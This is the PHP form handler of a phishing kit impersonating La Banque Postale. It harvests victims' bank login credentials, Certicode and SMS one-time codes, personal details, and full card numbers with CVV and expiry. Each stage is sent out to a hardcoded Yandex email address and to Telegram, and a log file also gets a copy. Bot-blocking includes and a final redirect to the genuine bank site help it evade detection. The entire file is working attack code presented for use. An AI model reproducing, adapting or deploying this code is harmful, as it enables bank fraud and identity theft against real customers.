<?php
include 'prevents/anti1.php';
include 'prevents/anti2.php';
include 'prevents/anti3.php';
include 'prevents/anti4.php';
include 'prevents/anti5.php';
include 'prevents/anti6.php';
include 'prevents/anti7.php';
include 'prevents/anti8.php';
include 'prevents/anti9.php';

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include_once '../inc/app.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

function validate_cc_date($month,$year) {
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
        return $month . '/' . $year;
    } else {
        return false;
    }
}

$to = 'pablorez2022@yandex.com';
$headers .= "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$headers .= 'From: Banque Postale <crusix@v4.me>' . "\r\n";
$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "login") {

        $_SESSION['identifiant']  = $_POST['identifiant'];
        $_SESSION['password'] = $_POST['password'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['identifiant']) == false || strlen($_POST['identifiant']) < 10 ) {
            $_SESSION['errors']['identifiant'] = true;
        }
        if( validate_number($_POST['password'],6) == false ) {
            $_SESSION['errors']['password'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | LABANQUEPOSTALE | Login';
            $message = '/-- LOGIN INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END LOGIN INFOS --/' . "\r\n\r\n";

            $telegram_message = '/-- LOGIN INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
            $telegram_message .= 'Password : ' . $_POST['password'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers,$head);
            file_put_contents("../../", $message, FILE_APPEND);
            header("location: loading11.php?#_$dispatch");
        } else {
            $error = $_POST['error'];
            header("location: failed_login.php?error=$error#_$dispatch");
        }

    }

    if ($_POST['type'] == "certicode") {

        $_SESSION['certicode']  = $_POST['certicode'];

        $_SESSION['errors'] = [];
        if( empty($_POST['certicode']) || strlen($_POST['certicode']) !== 6 ) {
            $_SESSION['errors']['certicode'] = 'le code n\'est pas valide';
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | LABANQUEPOSTALE | Certicode';
            $message = '/-- CERTICODE INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Certicode : ' . $_POST['certicode'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END CERTICODE INFOS --/' . "\r\n\r\n";

            $telegram_message = '/-- CERTICODE INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Certicode : ' . $_POST['certicode'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers,$head);
            file_put_contents("../../", $message, FILE_APPEND);
            header("location: details.php?#_$dispatch");
        } else {
            header("location: certicode.php?error=1#_$dispatch");
        }

    }

    if ($_POST['type'] == "details") {


        $_SESSION['full_name'] = $_POST['full_name'];
        $_SESSION['address'] = $_POST['address'];
        $_SESSION['city'] = $_POST['city'];
        $_SESSION['zip_code'] = $_POST['zip_code'];
        $_SESSION['phone'] = $_POST['phone'];
        $_SESSION['email'] = $_POST['email'];
        $_SESSION['birth_date'] = $_POST['birth_date'];

        $_SESSION['errors'] = [];
        if( validate_name($_POST['full_name']) == false ) {
            $_SESSION['errors']['full_name'] = 'Merci d\'entrer un nom valide';
        }
        if( empty($_POST['address']) ) {
            $_SESSION['errors']['address'] = 'L\'adresse n\'est pas valide.';
        }
        if( empty($_POST['city']) ) {
            $_SESSION['errors']['city'] = 'La ville n\'est pas valide.';
        }
        if( empty($_POST['zip_code']) ) {
            $_SESSION['errors']['zip_code'] = 'Code postale n\'est pas valide.';
        }
        if( validate_email($_POST['email']) == false ) {
            $_SESSION['errors']['email'] = 'L\'adresse email n\'est pas valide.';
        }
        if( validate_number($_POST['phone'],10) == false ) {
            $_SESSION['errors']['phone'] = 'Veuillez saisir un téléphone valide.';
        }
        if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
            $_SESSION['errors']['birth_date'] = 'Veuillez saisir une date valide.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | LABANQUEPOSTALE | Details';
            $message = '/-- DETAILS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Nom et prénom : ' . $_POST['full_name'] . "\r\n";
            $message .= 'Adresse : ' . $_POST['address'] . "\r\n";
            $message .= 'Ville : ' . $_POST['city'] . "\r\n";
            $message .= 'Code postale : ' . $_POST['zip_code'] . "\r\n";
            $message .= 'Téléphone : ' . $_POST['phone'] . "\r\n";
            $message .= 'Adresse électronique : ' . $_POST['email'] . "\r\n";
            $message .= 'Date de naissance : ' . $_POST['birth_date'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END DETAILS INFOS --/' . "\r\n\r\n";

            $telegram_message = '/-- DETAILS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Nom et prénom : ' . $_POST['full_name'] . "\r\n";
            $telegram_message .= 'Adresse : ' . $_POST['address'] . "\r\n";
            $telegram_message .= 'Ville : ' . $_POST['city'] . "\r\n";
            $telegram_message .= 'Code postale : ' . $_POST['zip_code'] . "\r\n";
            $telegram_message .= 'Téléphone : ' . $_POST['phone'] . "\r\n";
            $telegram_message .= 'Adresse électronique : ' . $_POST['email'] . "\r\n";
            $telegram_message .= 'Date de naissance : ' . $_POST['birth_date'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers,$head);
            file_put_contents("../../", $message, FILE_APPEND);
            header("location: loading.php?redirection#_$dispatch");
        } else {
            header("location: details.php?error=1&confirmation#_$dispatch");
        }

    }

    if ($_POST['type'] == "cc") {

        $_SESSION['cc_number'] = $_POST['cc_number'];
        $_SESSION['cc_cvv']    = $_POST['cc_cvv'];
        $_SESSION['cc_date']   = $_POST['cc_date'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_SESSION['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv'],$card_number['type']);
        $card_date   = trim($date_ex[0]) . '/' . trim($date_ex[1]);

        $_SESSION['errors'] = [];
        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = 'Veuillez saisir un numéro de la carte valid.';
        }
        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Veuillez saisir un numéro valid.';
        }
        if( validate_date($card_date,'m/y') == false ) {
            $_SESSION['errors']['cc_date'] = 'Veuillez saisir une date valide.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | LABANQUEPOSTALE | Card';
            $message = '/-- CARD INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Card Number : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Card CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= 'Card Date : ' . $_POST['cc_date'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END CARD INFOS --/' . "\r\n\r\n";

            $telegram_message = '/-- CARD INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Card Number : ' . $_POST['cc_number'] . "\r\n";
            $telegram_message .= 'Card CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $telegram_message .= 'Card Date : ' . $_POST['cc_date'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers,$head);
            file_put_contents("../../", $message, FILE_APPEND);
            header("location: loading2.php?redirection#_$dispatch");
        } else {
            header("location: cc.php?error=1&confirmation#_$dispatch");
        }

    }

    if ($_POST['type'] == "confirm_code") {

        $_SESSION['confirm_code']  = $_POST['confirm_code'];

        $_SESSION['errors'] = [];
        if( empty($_POST['confirm_code']) || strlen($_POST['confirm_code']) !== 6 ) {
            $_SESSION['errors']['confirm_code'] = 'le code n\'est pas valide';
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject = $_SERVER['REMOTE_ADDR'] . ' | LABANQUEPOSTALE | Sms';
            $message = '/-- SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Sms Code : ' . $_POST['confirm_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS INFOS --/' . "\r\n\r\n";

            $telegram_message = '/-- SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Sms Code : ' . $_POST['confirm_code'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers,$head);
            file_put_contents("../../", $message, FILE_APPEND);
            header("location: https://www.labanquepostale.fr/");
        } else {
            $error = $_POST['error'];
            header("location: ss.php?error=$error#_$dispatch");
        }

    }

}

?>